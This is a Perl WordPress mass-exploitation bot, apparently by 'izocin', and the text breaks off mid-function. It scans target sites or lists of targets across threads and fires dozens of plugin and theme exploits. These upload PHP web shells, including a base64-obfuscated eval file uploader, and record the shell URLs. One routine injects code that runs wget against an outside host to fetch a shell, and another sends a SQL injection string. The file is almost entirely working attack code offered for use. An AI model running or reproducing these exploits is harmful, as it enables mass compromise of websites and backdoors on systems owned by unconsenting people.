﻿#!/usr/bin/perl
#Coded By izocin 28/04/2018
#https://www.facebook.com/izo.cin.73
#My Store: https://selly.gg/@izocin
#My Blog: https://izocin.wordpress.com
use WWW::Mechanize;
use LWP::Simple;
use URI::URL;
use LWP::UserAgent;
use Getopt::Long;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
use Getopt::Long;
use HTTP::Request;
use LWP::UserAgent;
use Digest::MD5 qw(md5 md5_hex);
use MIME::Base64;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use URI::URL;
use DBI;
use IO::Socket;
use IO::Socket::INET;
use WWW::Mechanize;
use threads;

system ("izocin bot");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'blue on_green'),"\n";print color('reset');
print colored ("                                  [ c0d3d bY izocin ]                            ",'white on_green'),"\n";print color('reset');
print colored ("                                   [ WordPress  bOT ]                            ",'white on_green'),"\n";print color('reset');
print colored ("                                         [ Multi ]                               ",'white on_green'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'blue   on_green'),"\n";	print color('reset');
$spyhrabchedched = "  
\n \n		
	      WordPress perl Bot\n
	    Blog: https://izocin.wordpress.com\n	
\n\n";
################ Check Update #####################
print $spyhrabchedched;
print color('bold yellow'),"[";
print color('bold red'),"1";
print color('bold yellow'),"] ";
print color('bold white'),"Single attack mod\n";
print color('bold yellow'),"[";
print color('bold red'),"2";
print color('bold yellow'),"] ";
print color('bold white'),"Bing Dorker\n";
print color('bold yellow'),"[";
print color('bold red'),"3";
print color('bold yellow'),"] ";
print color('bold white'),"Multitheard Mod\n";


my $whatspywant = <STDIN>;
chomp $whatspywant;
if($whatspywant eq '1'){
single();
}
if($whatspywant eq '2'){
bing();
}
if($whatspywant eq '3'){
beastmode();
}
sub single($site){
system(($^O eq 'MSWin32') ? 'cls' : 'clear');

print <<logo;
                                                              
izocin wordpress bot single mode         
                     
logo

print "\nEnter Your Target URL > ";
$site=<>;
chomp($site);
cmsdetc();
}
sub bing(){
system ("cls");
system("perl dork.pl");
}

sub beastmode($site){
print "Theard : \n";
my $thr = <STDIN>;
chomp $thr;
print "List : \n";

my $file = <STDIN>;
chomp $file;

open(sites,"<".$file) or die $!;
while($site = <sites>)
{
chomp($site);
push(@threads, threads->create (\&bot, $site));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
}
eval {
$_->join foreach @threads;
@threads = ();
};
close(sites);

sub bot(){

cmsdetc();
}

################ CMS DETCTER #####################
sub cmsdetc($site){
##$ua = LWP::UserAgent->new(keep_alive => 1);
$ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
my $cms = $ua->get("$site")->content;
my $cmsd = $ua->get("$site/wp-includes/js/jquery/jquery.js")->content;
$wpsite = $site . '/wp-login.php';
my $wpcms = $ua->get("$wpsite")->content;
my $wpcmsx = $ua->get("$site/wp-login.php")->content;


if($cms =~/wp-content/) {

    open(save, '>>wpsite.txt');
    print save "$site\n";   
    close(save);
    exploitwp();
}
elsif($wpcms =~/WordPress/) {

    open(save, '>>wpsite.txt');
    print save "$site\n"; 
    close(save);
    exploitwp();
}
elsif($wpcmsx =~/WordPress/) {
 
    open(save, '>>wpsite.txt');
    print save "$site\n"; 
    close(save);
    exploitwp();
}
elsif($cmsd =~/password/) {

    open(save, '>>wpsite.txt');
    print save "$site\n"; 
    close(save);
    exploitwp();
}	

else{

    open(save, '>>tmp/Unknown.txt');
    print color('reset'); 
    print save "$site\n";   
    close(save);

}
sub exploitwp(){
    vers();
    getins();
    userp();
    gravityforms();
	gravityformsb();
    revslider();
    getconfig();
	getcpconfig();
    showbiz();
	addblockblockerty();
    woopra();
    wooprat();
    woopratt();
    wooprattt();	
    slimstat();	
    addblockblocker();
    worce();
    learndash();
	learndashx();
    learndash2();
	cubedse();
	cubedsebb();
	cubedses();
	cubedsess();
	cubedsesss();
    cubedaad();
	cubedaade();
	cubednb();
	cubedfgy();
	cubedfgya();
    cubedoh();	
	cubed();
	rhgty();
	dzupx();
	rhgbbrt();	
	rhgbb();
	comsxx();
	comzzz();
	seoww();
	comzcc();
	pith();
    satos();
	cusadx();
    pinb();
	barc();
    army();
	bard();
	asrd();	
    evol();
    acft();	
    #desg();	
    wof();
    wof1();
	virald();
	viraldz();
	viraldzy();
	viraldzyx();	
	viraldd();
    wof2();
	custox();
    wof3();	
    tst();	
	wofind();	
	mms();
	xxsav();
    xxsd();
	at1();
	at2();
    viral();
    jsor();	
    wptema();	
    blaze();
    catpro();
	xxad();
	xxnf();	
	xxzd();
	xxvg();	
	xxcc();	
	nineto();	
    cherry();
    downloadsmanager();
	expadd();
	expaddd();
    formcraft();
    formcraft2();
	brainstorm();
	xav();
	izxc();
    con7();	
    fuild();
    levoslideshow();
    vertical();
	carousel();
	superb();
	yass();
	homepage();
	ipage();
	bliss();	
    xdata();	
    powerzoomer();
    ads();
    slideshowpro();
    wpmobiledetector();
    wysija();
    inboundiomarketing();
    dzszoomsounds();
    reflexgallery();
    sexycontactformz();
	realestate();
    wtffu();
    wpjm();
    wpjmtt();	
    phpeventcalendar();
	phpeventcalendars();	
    synoptic();
	udesig();
	workf();
    Wpshop();
    wpinjection();
    adad();
	qqwe();
	qqqwe();
	qqqqwe();
	qqqqqwe();
	qqqqqqwe();
	qqqqqqqwe();
	qqqqqqqqwe();
	qqqqqqqqqwe();
	qqqqqqqqqqwe();
	qqqqqqqqqqqwe();
	qqqqqqqqqqqqwe();
	qqqqqqqqqqqqqwe();
	qqqqqqqqqqqqqqwe();
	qqqqqqqqqqqqqqqwe();
	wpbrute();
}

################ Version #####################
sub vers(){

$getversion = $ua->get($site)->content;

if($getversion =~/content="WordPress (.*?)"/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wp Version";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"$1";
print color('bold white'),"\n";
open (TEXT, '>>version.txt');
print TEXT "wp => $site => $1\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wp Version";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
sub getins(){
$url = "$site/wp-admin/install.php?step=1";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/Install WordPress/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wordpress installer";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>install.txt');   
    print save "[wpinstall] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wordpress installer";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub userp(){
$url = "$site/?up_auto_log=true";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/logout/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wordpress user pro";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>install.txt');   
    print save "[wpinstall] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wordpress user pro";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ Adblock Blocker #####################
sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ Adblock Blocker #####################
sub addblockblockerty(){

my $addblockurl = "$site/wp-content/themes/betheme/muffin-options/fields/upload/field_upload.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ['files[]' => ["tool/priv.php"],]);
$addblockup="$site/wp-content/themes/betheme/muffin-options/fields/upload/Files/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"betheme";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"betheme";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
sub woopra(){ 
my $url = "$site/wp-content/plugins/woopra/inc/php-ofc-library/ofc_upload_image.php?name=xxb.php";

my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $url,
        Content_Type => 'text/plain',
        Content => $index
        );

$zoomerup="$site/wp-content/plugins/woopra/inc/tmp-upload-images/xxb.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"woopra RCE";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"woopra RCE";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
sub wooprat(){ 
my $url = "$site/wp-content/plugins/invit0r/lib/php-ofc-library/ofc_upload_image.php?name=xxb.php";

my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $url,
        Content_Type => 'text/plain',
        Content => $index
        );

$zoomerup="$site/wp-content/plugins/invit0r/lib/tmp-upload-images/xxb.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"invit0r";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"invit0r";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
sub woopratt(){ 
my $url = "$site/wp-content/plugins/formidable/pro/js/ofc-library/ofc_upload_image.php?name=xxb.php";

my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $url,
        Content_Type => 'text/plain',
        Content => $index
        );

$zoomerup="$site/wp-content/plugins/formidable/pro/js/tmp-upload-images/xxb.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"formidable";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"formidable";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
sub wooprattt(){ 
my $url = "$site/wp-content/plugins/evarisk/include/lib/actionsCorrectives/activite/uploadPhotoApres.php?qqfile=xxb.php";

my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $url,
        Content_Type => 'application/octet-stream',
        Content => $index
        );

$zoomerup="$site/wp-content/plugins/evarisk/include/lib/actionsCorrectives/activite/xxb.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"evarisk";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"evarisk";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
sub slimstat(){ 
my $url = "$site/wp-content/plugins/wp-slimstat-ex/lib/ofc/php-ofc-library/ofc_upload_image.php?name=xxb.php";

my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $url,
        Content_Type => 'text/plain',
        Content => $index
        );

$zoomerup="$site/wp-content/plugins/wp-slimstat-ex/lib/ofc//tmp-upload-images/xxb.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wp-slimstat RCE";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wp-slimstat RCE";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ woocommerce RCE #####################
sub worce(){

my $addblockurl = "$site/produits/?items_per_page=%24%7b%40eval(base64_decode(cGFzc3RocnUoJ2NkIHdwLWNvbnRlbnQvdXBsb2Fkcy8yMDE4LzAxO3dnZXQgaHR0cDovL3d3dy5hd3RjLmFpZHQuZWR1Ly9jb21wb25lbnRzL2NvbV9iMmpjb250YWN0L3VwbG9hZHMvdHh0LnR4dDttdiB0eHQudHh0IGl6b20ucGhwJyk7))%7d&setListingType=grid";

my $checkaddblock = $ua->get("$addblockurl")->content;
$dmup="$site/wp-content/uploads/2018/01/izom.php";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/SangPujaan/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"woocommerce RCE";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"woocommerce RCE";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedse(){

my $addblockurl = "$site/wp-content/plugins/complete-gallery-manager/frames/upload-images.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [qqfile => ["tool/priv.php"],]);
$addblockup="$site/wp-content/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Complete-Gallery-Manager";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Complete-Gallery-Manager";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedsebb(){

my $addblockurl = "$site/wp-content/plugins/levelfourstorefront/scripts/administration/dbuploaderscript.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],'reqID'=>"1'or 1='1",]);
$addblockup="$site/wp-content/plugins/levelfourstorefront/products/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Shopping Cart";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Shopping Cart";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedses(){

my $addblockurl = "$site/wp-content/plugins/auctionPlugin/uploadify/upload.php?folder=/wp-content/uploads/";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"auctionPlugin";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"auctionPlugin";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedsess(){

my $addblockurl = "$site/wp-content/themes/area53/framework/_scripts/valums_uploader/php.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [qqfile => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"area53";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"area53";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedsesss(){

my $addblockurl = "$site/wp-content/themes/ut-strange/addpress/includes/ap_fileupload.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file_upload => ["tool/priv.php"],'themeroot' => '.']);
$addblockup="$site/wp-content/themes/ut-strange/addpress/includes/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"ut-strange";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"ut-strange";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedaad(){

my $addblockurl = "$site/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"ThisWay";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
